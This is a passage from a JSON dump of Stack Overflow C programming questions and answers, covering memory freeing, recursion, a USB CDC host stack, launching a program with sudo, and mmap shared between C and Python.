evaluating the &amp; address of operator.&quot;: <code>char *p = malloc(10); free(&amp;p[0]);</code> would work just fine for example. It&#39;s not the address-of but whether it yields the correct pointer that matters."}], "tags": [], "owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "is_accepted": false, "score": 4, "last_activity_date": 1518748811, "last_edit_date": 1518748811, "creation_date": 1518626310, "answer_id": 48792080, "question_id": 48791968, "link": "https://stackoverflow.com/questions/48791968/c-programming-sigabrt-134-error-am-i-freeing-this-memory-correctly/48792080#48792080", "title": "C programming: SIGABRT 134 error; am I freeing this memory correctly?", "body": "<p>If you <code>free()</code> the multiple <code>Stack</code> pointers &mdash; <em>to take one as an examle</em> &mdash; you are really always freeing the same pointer.</p>\n\n<p>When you declare the structure as <code>static</code> in the function scope it's only initialized once, subsequent calls will affect the pointer that you returned initially and thus using <code>malloc()</code> on one member effectively makes all your pointers point to the same <code>malloc()</code>ed area. So the previous pointer it pointed to is now lost and you can't free it.</p>\n\n<p>Moreover, you can't <code>free()</code> something that wasn't returned by <code>malloc()</code>. Specially it's supicious and porbably wrong to call <code>free()</code> on a pointer that is actually the result of evaluating the <code>&amp;</code> address of operator.</p>\n\n<p>Your code should probably be fixed as follows,</p>\n\n<pre><code>Interval *\nnewInterval(int b, int e, int m)\n{\n    Interval *interval;\n    interval = malloc(sizeof(*interval));\n    if (interval == NULL)\n        return NULL;\n    interval-&gt;b = b;\n    interval-&gt;e = e;\n    interval-&gt;m = m;\n    return interval;\n}\n\nSignal *\nnewSignal(int size)\n{\n    Signal *signal;\n    signal = malloc(sizeof(*signal));\n    if (signal == NULL)\n        return NULL;\n    signal-&gt;intervals = malloc(size * sizeof(*signal-&gt;intervals));\n    if (signal-&gt;intervals == NULL) {\n        free(signal);\n        return NULL;\n    }\n    signal-&gt;top = 0;\n    signal-&gt;size = size;\n    return signal;\n}\n\nStack *\nnewStack(int size)\n{\n    Stack *stack;\n    stack = malloc(sizeof(*stack));\n    if (stack == NULL)\n        return NULL;\n    stack-&gt;signals = malloc(size * sizeof(*stack-&gt;signals));\n    if (stack-&gt;signals == NULL) {\n        free(stack);\n        return NULL;\n    }\n    stack-&gt;top = 0;\n    stack-&gt;size = size;\n    return stack;\n}\n</code></pre>\n\n<p>Also, good design is important and a function called <code>print*</code> shall not free anything at all, in fact you should avoid freeing memory in a given context that was allocated in a different context.</p>\n"}], "owner": {"reputation": 179, "user_id": 6120593, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/7f7e8ab8ed7b9da7f84a33371a041705?s=128&d=identicon&r=PG&f=1", "display_name": "Coma", "link": "https://stackoverflow.com/users/6120593/coma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1112, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518748811, "creation_date": 1518625894, "question_id": 48791968, "link": "https://stackoverflow.com/questions/48791968/c-programming-sigabrt-134-error-am-i-freeing-this-memory-correctly", "title": "C programming: SIGABRT 134 error; am I freeing this memory correctly?", "body": "<p>I have a nested datastructure as such (these are the initalizations):</p>\n\n<pre><code>Interval *newInterval(int b, int e, int m){\n    static Interval i;\n    i.b = b;\n    i.e = e;\n    i.m = m;\n    return &amp;i;\n}\nSignal *newSignal(int size){\n    static Signal s;\n    s.intervals = malloc(size * sizeof(Interval));\n    s.top = 0;\n    s.size = size;\n    return &amp;s;\n}\n\nStack *newStack(int size){\n    static Stack st;\n    st.signals = malloc(size * sizeof(Signal));\n    st.top = 0;\n    st.size = size;\n    return &amp;st;\n}\n</code></pre>\n\n<p><strong>How they the data is structured:</strong> Multiple Interval struct pointers are stored in the 'intervals' array of each Signal struct. Each Signal struct pointer is stored in the 'signals' array of a Stack struct (there will always only be one).</p>\n\n<pre><code>        -&gt; [Signal 0] -&gt; [Interval 0][Interval 1][Interval 2]...\n[Stack] -&gt; [Signal 1] -&gt; [Interval 0][Interval 1]\n        -&gt; [Signal 2] -&gt; [Interval 0][Interval 1][Interval 2]...\n</code></pre>\n\n<p><strong>How I try to access and free data:</strong> I have two functions that print out data from within the structures, and attempt to free the memory allocated using malloc (and realloc). However I seem to be getting a SIGABRT (error 134). I suppose this is because of how I free the memory; but I don't know what to do!</p>\n\n<pre><code>    void pop(Signal *s, int n){\n    if(n &lt; s-&gt;top) {\n        printf(\"[%d,%d)@%d \", s-&gt;intervals[n].b, s-&gt;intervals[n].e, s-&gt;intervals[n].m);\n        pop(s,n+1);\n    }\n    else {\n        free(s-&gt;intervals);\n    }\n}\n\nvoid printIntervals(Stack *st){\n    for(int i=0; i&lt;st-&gt;top; i++){\n        pop(&amp;(st-&gt;signals[i]), 0);\n        printf(\"\\n\");\n        free(&amp;(st-&gt;signals[i]));\n    }\n}\n</code></pre>\n\n<blockquote>\n  <p><strong>1.</strong> printIntervals is called once, and in turn calls the pop function for each signal.</p>\n  \n  <p><strong>2.</strong> The pop function recursively prints out each interval struct, until the array containing intervals is empty, at which point I\n  attempt to free the intervals array from the signal.</p>\n  \n  <p><strong>3.</strong> At this point pop finishes, and the flow goes back to printIntervals. Here, I attempt to free the signals array as there's\n  nothing left to print, and the loop moves on to print the next signal\n  from the Stack.</p>\n</blockquote>\n\n<p>Is the way I free memory incorrect? How can I fix the memory error? Thank you.</p>\n"}, {"tags": ["c", "recursion"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518627596, "post_id": 48791655, "comment_id": 84587206, "body": "&quot;However, I seem to get an infinite loop until the program crashes.&quot; Better to post the input used or even better, just code <code>printf(&quot;%d&quot;, calc(&#47;* Substitute here *&#47; The_input_that_caused_the_problem));</code>  BTW: did you write this code?"}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1518628648, "post_id": 48791886, "comment_id": 84587811, "body": "NMDV, yet OP has not demonstrated de-bugging efforts.  Even good answers then may encouraging <a href=\"http://idownvotedbecau.se/nodebugging/\" rel=\"nofollow noreferrer\">no effort to debug the code</a>"}, {"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518629194, "post_id": 48791886, "comment_id": 84588078, "body": "@chux.: You know me at least in SO domain and I don&#39;t support it. I like solving problems at times...the OP even after giving this answer, if tries to get the idea - OP will learn the algorithm or the idea. If OP wouldn&#39;t try that I can ensure you that OP won&#39;t learn anything even if answer is not provided. OP would copy from friend&#39;s and will try to post it in other forums etc. True learner won&#39;t stop at an answer. Also if your question is why did I answer? I answered because it posed a bit of challenge to detect it (Yes it is very small but there is some)...I like it like all of you guys."}], "tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 1, "last_activity_date": 1518626142, "last_edit_date": 1518626142, "creation_date": 1518625658, "answer_id": 48791886, "question_id": 48791655, "link": "https://stackoverflow.com/questions/48791655/169-algorithm-in-c-language/48791886#48791886", "title": "169-algorithm in C language", "body": "<p>Your <code>calc</code> method should be</p>\n\n<pre><code>int calc(int num){\n  int sum = 0; //Declare sum as 0\n  int inum = invert_int(num,0); //Calculate the inverse of num by calling invert_int, having the number and 0 as parameters\n//If num=inum, then it's a palindrome\n  if(num==inum){\n    return num; //Return sum to end &lt;--- change here\n  }else{\n    sum=num+inum; //sum = number + inverted number\n    printf(\"%d + %d = %d\",num,inum,sum); //Print the previous sum\n    return calc(sum); &lt;--- just call `calc` again.\n  }\n}\n</code></pre>\n\n<p>Earlier you are calling <code>calc</code> with wrong parameters and every time it branched with the same number but the next call was never the same. There is no need to pass the <code>sum = sum + calc(num);</code> num again in <code>calc()</code>. This created the infinite loop.</p>\n\n<p>Also to give an explanation for the changes I made - the thing is whenever you are dry running the algorithm - you are first calculating the number and reverse number and then you checked both of the. If they don't match do you pass the real number? No. You pass the sum of them and that's what is being done here.</p>\n"}], "owner": {"reputation": 167, "user_id": 4338788, "user_type": "registered", "accept_rate": 40, "profile_image": "https://lh6.googleusercontent.com/-PQxV0zmoZbA/AAAAAAAAAAI/AAAAAAAAB3w/TBt33LDI1Fg/photo.jpg?sz=128", "display_name": "Arnau", "link": "https://stackoverflow.com/users/4338788/arnau"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "closed_date": 1518627394, "answer_count": 1, "score": -1, "last_activity_date": 1518626142, "creation_date": 1518624902, "last_edit_date": 1518625758, "question_id": 48791655, "link": "https://stackoverflow.com/questions/48791655/169-algorithm-in-c-language", "closed_reason": "Not suitable for this site", "title": "169-algorithm in C language", "body": "<p>I need to write a program with the 169-algorithm in the C language. However, I seem to get an infinite loop until the program crashes.</p>\n\n<p>For any natural number <code>n</code>, the operation of \u201cinverting and adding\u201d consists of inverting the digits of <code>n</code> and adding up the\nvalue of <code>n</code>. For example, consider <code>n = 345</code>. Inverting its digits we obtain the number <code>543</code>. Now we have to add <code>n</code> to this number, that is,\n<code>n + 543 = 345 + 543 = 888</code>. For most of natural numbers this process, repeated reiteratively, ends up producing a number which is\npalindrome. For instance, number <code>59</code> produces the sequence <code>59</code>, <code>154</code>, <code>605</code>, and <code>1111</code>, as <code>(59 + 95) = 154</code>, <code>(154 + 451) = 605</code>, and <code>(605 + 506) = 1111</code>. The function can assume that the initial call to the function will always be done with a number which, at some point, obtains a palindrome number.</p>\n\n<p>This is the code that have so far:</p>\n\n<pre><code>int invert_int(int n, int m) {\n    int div = n / 10; //Divide n by 10\n    if (div == 0)\n        return (n + m * 10); //If the division is equal to 0, then return n*+m*10\n    return (invert_int(div, n % 10 + m * 10)); //If not, calculate the inverse of it again\n}\n\nint calc(int num) {\n    int sum = 0; //Declare sum as 0\n    int inum = invert_int(num, 0); //Calculate the inverse of num by calling invert_int, having the number and 0 as parameters\n    //If num=inum, then it's a palindrome\n    if (num == inum) {\n        return sum; //Return sum to end\n    } else {\n        sum = num + inum; //sum = number + inverted number\n        printf(\"%d + %d = %d\", num, inum, sum); //Print the previous sum\n        sum = sum + calc(num); //Add the next number to sum\n        return sum;\n    }\n}\n\nint main(int argc, char** argv) {\n    int input; //Declare variable to store the user's input\n    printf(\"Introduce a number:\"); \n    scanf(\"%d\", &amp;input); //Scan a number\n    printf(\"%d\", calc(input)); //Print the result of the calculation by calling calc with 'input' as argument\n    return (EXIT_SUCCESS);\n}\n</code></pre>\n\n<p>I don't seem to see the problem here. Could anybody help me? Thank you in advance.</p>\n"}, {"tags": ["c", "usb", "microcontroller", "cortex-m", "nxp-microcontroller"], "owner": {"reputation": 21, "user_id": 9360356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/357cf73833df986ea3efc25381ebd524?s=128&d=identicon&r=PG&f=1", "display_name": "B.Stahl", "link": "https://stackoverflow.com/users/9360356/b-stahl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 203, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1518624307, "creation_date": 1518624307, "question_id": 48791448, "link": "https://stackoverflow.com/questions/48791448/how-to-get-usb-host-cdc-surf-stick-connection-working-on-a-cortex-m4", "title": "How to get USB Host CDC (Surf Stick) connection working on a Cortex M4", "body": "<p>I'm working on a project to connect a Hauwai E3531i-2 Surf Stick to the frdmk64F-board (a dev board for the Cortex M4 from NXP) via USB and I ran into difficulties with the CDC-Host Stack. My goal is to send AT-Commands like a Terminal Tool via the USB-Port. For testing purpose and because it was in the example all the data gets streamed to a Terminal(Putty/Terra Term/HTerm) on my Computer. Where I also send the Data from.</p>\n\n<p>I'm working with Kinetis Design Studio(KDS) 3.2 and Kinetis Software Develpment Kid (KSDK)2.2 and got the USB-Host BM examples CDC and MSD running and modified them for my purpose. I rewrote the enumeration process so I can differ between different Classes automatically and do Init and Task accordingly.</p>\n\n<p>With this Stick it necessary to first connect him as am Mass Storage because by default it enumerates as an MSD containing the drivers for Windows. So I connect it as an MSD-Device and send a \"ModeSwitch\"-Command. The Linux users will be familiar with this procedure. The Stick then disconnects itself and will be enumerated as a Vendor Specific Device (Class: 0xFF). Unfortunately not as a CDC Device.  So long so good, just like it does in Linux where I now could send the AT commands via Terminal e.g. MiniCom.  Now my code loads the CDC-Component it runs just like the CDC-Host example from this point. I get a few errors:</p>\n\n<ol>\n<li><p>The Interrupt Pipe fails to be established</p></li>\n<li><p>Line State is \"ok\", but all Values are zero.</p></li>\n<li><p>data transfer error with code 10</p></li>\n</ol>\n\n<p>The example by itself doesn't do anything visible from this point on. After some trying I got to a point where I got it kind of running. It's highly unstable, but I think I found something. The Problem seems to come from the Buffer struct</p>\n\n<pre><code>typedef struct _usb_uart_buffer_struct\n{\n uint8_t buffer[USB_HOST_SEND_RECV_PER_TIME];\n uint32_t dataLength;\n struct _usb_uart_buffer_struct *next;\n} usb_uart_buffer_struct_t; \n</code></pre>\n\n<p>and the corresponding Variables </p>\n\n<pre><code>usb_uart_buffer_struct_t g_EmptyBuffer[USB_HOST_CDC_BUFFER_NUM];\n usb_uart_buffer_struct_t g_EmptySendBuffer[USB_HOST_CDC_BUFFER_NUM];\nusb_uart_buffer_struct_t *g_EmptyQueue;\n usb_uart_buffer_struct_t *g_EmptySendQueue;\nusb_uart_buffer_struct_t *g_CurrentUartRecvNode;\nusb_uart_buffer_struct_t *g_UsbSendQueue;\n usb_uart_buffer_struct_t *g_UsbSendNode;\n usb_uart_buffer_struct_t *g_CurrentUsbRecvNode;\nusb_uart_buffer_struct_t *g_UartSendQueue;\n usb_uart_buffer_struct_t *g_UartSendNode;\n</code></pre>\n\n<p>They are used to store the data coming for the USB-Pipes and the Debug Terminal in this example. As you can see they are a sort of List containing the Data in a Buffer, the Number of Bytes in the Buffer and a Pointer to the next List element. </p>\n\n<p>But at some point the next Element and the current Element is NULL and from this point onward I can't receive any more messages. A reset of the Buffers helps but this causes other errors. This is the code I got kind of running.</p>\n\n<pre><code>case kRunIdle:\n            if (g_AttachFlag)\n            {\n\n                      {\n                if (!g_UsbSendBusy)\n                {\n                    if(g_UsbSendQueue)\n                      {\n               g_UsbSendNode = getNodeFromQueue(&amp;g_UsbSendQueue);\n               if (g_UsbSendNode)\n               {\n                   g_UsbSendBusy = 1;\n                   USB_HostCdcDataSend(g_cdc.classHandle, (uint8_t *)&amp;g_UsbSendNode-&gt;buffer[0],\n                              g_UsbSendNode-&gt;dataLength, USB_HostCdcDataOutCallback, &amp;g_cdc);\n\n               }\n                      }\n                    else\n              {\n                     if (g_EmptySendQueue)\n                       {\n\n                         g_CurrentUsbRecvNode = getNodeFromQueue(&amp;g_EmptySendQueue);\n//                   if (g_CurrentUsbRecvNode)\n                   {\n                           NoReceivCounter = 0;\n                    g_CurrentUsbRecvNode-&gt;next = NULL;\n                    g_CurrentUsbRecvNode-&gt;dataLength = USB_HOST_SEND_RECV_PER_TIME;\n                    USB_HostCdcDataRecv(g_cdc.classHandle, (uint8_t *)&amp;g_CurrentUsbRecvNode-&gt;buffer[0],\n                                  g_CurrentUsbRecvNode-&gt;dataLength, USB_HostCdcDataInCallback, &amp;g_cdc);\n\n                   }\n                       }\n               else\n                 {\n                   NoReceivCounter++;\n                 }\n              }\n                }\n\n                if (!g_UartSendBusy)\n                {\n                    if(g_UartSendQueue)\n                      {\n                g_UartSendNode = getNodeFromQueue(&amp;g_UartSendQueue);\n\n                if (g_UartSendNode)\n                {\n                 g_txfer.buffer = g_UartSendNode-&gt;buffer;\n                 g_txfer.size = g_UartSendNode-&gt;dataLength;\n                 g_UartSendBusy = 1;\n                 USB_UartSendNonBlocking((USB_UartType *)BOARD_DEBUG_UART_BASEADDR, &amp;g_UartHandle, &amp;g_txfer);\n                }\n                    }\n                }\n                g_UartActive++;\n\n                if (g_UartActive &gt; USB_HOST_UART_RECV_TIMEOUT_THRSHOLD)\n                {\n                    g_UartActive = 0;\n\n                    USB_BmEnterCritical(&amp;usbOsaCurrentSr);\n                    if ((g_CurrentUartRecvNode) &amp;&amp; (g_CurrentUartRecvNode-&gt;dataLength))\n                    {\n                        insertNodeToQueue(&amp;g_UsbSendQueue, g_CurrentUartRecvNode);\n                        g_CurrentUartRecvNode = getNodeFromQueue(&amp;g_EmptyQueue);\n                    }\n                    USB_BmExitCritical(usbOsaCurrentSr);\n                }\n\n            }\n            }\n         if (NoReceivCounter &gt; 90000 )\n         {\n            USB_HostCdcInitBuffer();\n            NoReceivCounter = 0;\n            }\n            break;\n</code></pre>\n\n<p>It basically comes from the host_cdc.c File in the example. I added some if conditions and the reset part between Line 22 to 39 and bevor the break. This causes the Buffers to be reinitialised after a specific amount of NULL received. As far as I understand the Text the g_EmptySendQueue contains the data I get from the Stick via USB but I have basically no clue how it gets in this Buffer.</p>\n\n<p>With this  I get the code running until I get an assertion error:</p>\n\n<pre><code>ASSERT ERROR \" xfer-&gt;dataSize \": file \"../drivers/fsl_uart.c\" Line \"715\" function name \"UART_TransferSendNonBlocking\"\n</code></pre>\n\n<p>I think this comes from some Interrupts firing while doing the reinitialisation or because some Flags aren't reset and the Code thinks it still has to send the Data.   </p>\n\n<p>But I get failures in USB_HostCdcDataRecv in usb_host_cdc.c</p>\n\n<pre><code>if (USB_HostMallocTransfer(cdcInstance-&gt;hostHandle, &amp;transfer) != kStatus_USB_Success)\n    {\n#ifdef HOST_ECHO\n        usb_echo(\"error to get transfer DataRecv\\r\\n\");\n#endif\n        return kStatus_USB_Error;\n    }\n</code></pre>\n\n<p>In the USB_HostMallocTransfer function the  Transfer Header seems to be missing. This error comes comes really really often, but when I \"mute\" it, it runs quite good. The amount of these messages scales witch the Counter NoReceivCounter and the Makro in host_cdc.h</p>\n\n<pre><code>/*! @brief buffer number used to data transfer */\n#define USB_HOST_CDC_BUFFER_NUM 10U\n</code></pre>\n\n<p>I'm not very familiar with USB and been working with Controllers for just half a year. So any information could help.</p>\n\n<p>Now I am wondering why do I have to reset the Buffers and how can I do it without causing the errors.</p>\n\n<p>How exactly is the Data received? How does it get inside the Buffers? I can't find anything related in the code.</p>\n\n<p>I have the feeling that it can't be this hard to get this running, it feels like maybe just some settings are wrong and now I try cure the symptoms but the sickness should be in plain sight.</p>\n\n<p>This is my first post so if I missed some important Information I'm happy to provide them.</p>\n\n<p>Cheers </p>\n\n<p>Bastian</p>\n"}, {"tags": ["c", "linux", "system", "sudo", "popen"], "comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 6, "creation_date": 1518623739, "post_id": 48791210, "comment_id": 84584436, "body": "<a href=\"https://meta.stackexchange.com/questions/66377/what-is-the-xy-problem\">XY problem</a>.  Figure out why the program that extracts the jpeg crashes when not root and fix that."}, {"owner": {"reputation": 15050, "user_id": 8605791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ae3be140b26db13a86d624dba4ef1c8?s=128&d=identicon&r=PG&f=1", "display_name": "llllllllll", "link": "https://stackoverflow.com/users/8605791/llllllllll"}, "edited": false, "score": 0, "creation_date": 1518623867, "post_id": 48791210, "comment_id": 84584521, "body": "Don&#39;t abuse <code>sudo</code> privilege, it&#39;s bad especially for security reason. Your program is buggy, fixing the bug is what you need to do ."}], "answers": [{"tags": [], "owner": {"reputation": 1526, "user_id": 820290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a99d0fd15a8bf6f54344b59a29c5878?s=128&d=identicon&r=PG", "display_name": "Cwissy", "link": "https://stackoverflow.com/users/820290/cwissy"}, "is_accepted": false, "score": 0, "last_activity_date": 1518624755, "creation_date": 1518624755, "answer_id": 48791604, "question_id": 48791210, "link": "https://stackoverflow.com/questions/48791210/c-programming-execute-another-program-with-sudo-privileges/48791604#48791604", "title": "C programming - execute another program with sudo privileges", "body": "<p>fork and then use execl</p>\n\n<pre><code>char sudo[]=\"/usr/bin/sudo\";\nchar pbin[]=\"/usr/local/bin/puppet\";\nNOTICE(\"running puppet: %s %s\",sudo,pbin);\nerrno=0;\nexecl(sudo,sudo,pbin,(char *)NULL);\n/* we should never get as far as this */\n</code></pre>\n\n<p>obviously I recommend reading <code>man execl</code> for further info</p>\n"}, {"tags": [], "owner": {"reputation": 91, "user_id": 9136252, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-KnVj_e_4fH0/AAAAAAAAAAI/AAAAAAAAABs/gNaolC4_Xvg/photo.jpg?sz=128", "display_name": "TalkVideo Network", "link": "https://stackoverflow.com/users/9136252/talkvideo-network"}, "is_accepted": false, "score": 0, "last_activity_date": 1518625403, "creation_date": 1518625403, "answer_id": 48791804, "question_id": 48791210, "link": "https://stackoverflow.com/questions/48791210/c-programming-execute-another-program-with-sudo-privileges/48791804#48791804", "title": "C programming - execute another program with sudo privileges", "body": "<p>Unix (Linux) systems have contained a C Programming Manual in them since possibly forever. Look in Section 2, \"System Calls\".</p>\n\n<p>This Wikipedia Page explains the Unix Manual \"sections\"</p>\n\n<p>It is section 2 of the manual you can read about \"System Calls\"</p>\n\n<p>Try the command: man 2 setuid</p>\n\n<p>This will give you the manual for the setuid() system call which I think is what you want.</p>\n\n<p>That manual page will also list references to other related system calls that may be what you want.</p>\n\n<p>Remember when compiling C programs and using system calls that do low-level hardware access, to use the -O2, or -O3 option to gcc. There is a mention of it in the manual.</p>\n\n<p>Ultimately the setuid() system call makes a running process started by one user change the UID of that running process to be running as some other user. (For example, you may see the Apache running as \"apache\", even though it was started by root).</p>\n\n<p>setuid(0) lets you be root.</p>\n"}], "owner": {"reputation": 19, "user_id": 5073374, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10206870429589088/picture?type=large", "display_name": "Talkanian", "link": "https://stackoverflow.com/users/5073374/talkanian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1892, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1518625403, "creation_date": 1518623601, "question_id": 48791210, "link": "https://stackoverflow.com/questions/48791210/c-programming-execute-another-program-with-sudo-privileges", "title": "C programming - execute another program with sudo privileges", "body": "<p>i have a C program that opens an mp3 and extract the jpg artwork in the same folder. If i execute this program with no root privileges i get a crash. If i execute it with sudo it works normally. </p>\n\n<p>Now, i need another C programs who launch the previous program when it needs a jpg artwork for the selected mp3.</p>\n\n<p>I tried to call popen(\"./firstProgram test.mp3\" , \"r\") function or system(\"/(absolute path)/firstProgram test.mp3\") function by calling them even with sudo in the command or not and either with relative or absolute paths. But no version seems to work. </p>\n\n<p>How can i launch the first program from the second one with success? </p>\n\n<p>Thanks!</p>\n"}, {"tags": ["objective-c", "c", "swift"], "answers": [{"tags": [], "owner": {"reputation": 486140, "user_id": 1187415, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/LpTRB.png?s=128&g=1", "display_name": "Martin R", "link": "https://stackoverflow.com/users/1187415/martin-r"}, "is_accepted": true, "score": 1, "last_activity_date": 1518624144, "last_edit_date": 1518624144, "creation_date": 1518623371, "answer_id": 48791143, "question_id": 48790738, "link": "https://stackoverflow.com/questions/48790738/how-to-use-host-vm-info-count-in-swift-file/48791143#48791143", "title": "how to use HOST_VM_INFO_COUNT in swift file", "body": "<p><code>&lt;mach/host_info.h&gt;</code> defines <code>HOST_VM_INFO_COUNT</code> as</p>\n\n<pre><code>#define HOST_VM_INFO_COUNT ((mach_msg_type_number_t) \\\n            (sizeof(vm_statistics_data_t)/sizeof(integer_t)))\n</code></pre>\n\n<p>and \u201cnon-trivial\u201d macro definitions are not imported into Swift.\nTherefore you have to define it yourself:</p>\n\n<pre><code>let HOST_VM_INFO_COUNT = MemoryLayout&lt;vm_statistics_data_t&gt;.stride/MemoryLayout&lt;integer_t&gt;.stride\n</code></pre>\n\n<p>An alternative is to add</p>\n\n<pre><code>#import &lt;mach/host_info.h&gt;\n\nstatic const mach_msg_type_number_t HostVMInfoCount = HOST_VM_INFO_COUNT;\n</code></pre>\n\n<p>to the bridging header file and then use <code>HostVMInfoCount</code> in\nthe Swift code.</p>\n"}], "owner": {"reputation": 234, "user_id": 1101733, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2d9a017444e6e280f6615eba2ae0676a?s=128&d=identicon&r=PG", "display_name": "user1101733", "link": "https://stackoverflow.com/users/1101733/user1101733"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 150, "favorite_count": 0, "accepted_answer_id": 48791143, "answer_count": 1, "score": 1, "last_activity_date": 1518624144, "creation_date": 1518622155, "question_id": 48790738, "link": "https://stackoverflow.com/questions/48790738/how-to-use-host-vm-info-count-in-swift-file", "title": "how to use HOST_VM_INFO_COUNT in swift file", "body": "<p>I trying to use HOST_VM_INFO_COUNT in my swift file. In objective C it is working.\nI have tried by importing </p>\n\n<pre><code>#import &lt;mach/host_info.h&gt;\n</code></pre>\n\n<p>using bridging header but its not working.</p>\n"}, {"tags": ["python", "c", "mmap", "cross-language"], "comments": [{"owner": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "edited": false, "score": 1, "creation_date": 1518622285, "post_id": 48790691, "comment_id": 84583498, "body": "Your C code creates an anonymous mapping. Your Python code maps a file called &quot;hello.txt&quot;. They had better not be the same mapping. Or did you intend to map &quot;hello.txt&quot; in your C program?"}, {"owner": {"reputation": 13, "user_id": 2148209, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18150174fffd9f85c45f26116a496143?s=128&d=identicon&r=PG", "display_name": "viki", "link": "https://stackoverflow.com/users/2148209/viki"}, "reply_to_user": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "edited": false, "score": 0, "creation_date": 1518623130, "post_id": 48790691, "comment_id": 84584026, "body": "Ya, I intend to map hello.txt in my c program. I tried only with MAP_SHARED but couldn&#39;t make it to work. I thought, doing mmap with the same files, will start providing the data from the mapped memory region of the file and not exactly from the file."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 2148209, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18150174fffd9f85c45f26116a496143?s=128&d=identicon&r=PG", "display_name": "viki", "link": "https://stackoverflow.com/users/2148209/viki"}, "edited": false, "score": 0, "creation_date": 1518624181, "post_id": 48791097, "comment_id": 84584735, "body": "Thank you very much Rob."}], "tags": [], "owner": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "is_accepted": true, "score": 3, "last_activity_date": 1518623788, "last_edit_date": 1518623788, "creation_date": 1518623215, "answer_id": 48791097, "question_id": 48790691, "link": "https://stackoverflow.com/questions/48790691/mmap-a-same-file-in-both-c-and-python-will-it-really-use-the-shared-memory-wil/48791097#48791097", "title": "mmap a same file in both C and Python, will it really use the shared memory? will mmap work across different programming languages?", "body": "<p>In your C program, your <code>mmap()</code> creates an anonymous mapping, not a file-based mapping. You probably want to specify <code>fd</code> instead of <code>-1</code> and omit the <code>MAP_ANON</code> symbol.</p>\n\n<pre><code>shared = (char *)mmap(NULL, 1, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 2148209, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18150174fffd9f85c45f26116a496143?s=128&d=identicon&r=PG", "display_name": "viki", "link": "https://stackoverflow.com/users/2148209/viki"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1531, "favorite_count": 0, "accepted_answer_id": 48791097, "answer_count": 1, "score": 1, "last_activity_date": 1607231395, "creation_date": 1518622003, "last_edit_date": 